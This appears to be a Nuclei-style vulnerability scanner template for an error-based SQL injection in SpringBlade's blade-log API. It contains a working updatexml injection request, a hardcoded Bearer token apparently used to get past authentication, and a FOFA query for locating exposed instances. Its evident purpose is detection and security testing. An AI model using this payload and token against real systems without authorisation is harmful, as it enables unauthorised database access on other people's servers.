id: poc-yaml-springblade-blade-log-sqli
info:
  name: SpringBlade blade-log SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: springblade
    fofa-query: body="https://bladex.vip"

variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'

http:
  - raw:
      - |
        GET /api/blade-log/error/list?updatexml(1,concat(0x7e,md5({{t1}}),0x7e),1)=1 HTTP/1.1
        Host: {{Hostname}}
        Blade-Auth: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9..UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500

      - type: word
        part: body
        words:
          - "XPATH syntax error"
          - "{{substr(t2, 0, 31)}}"

      - type: word
        part: header
        words:
          - "application/json"
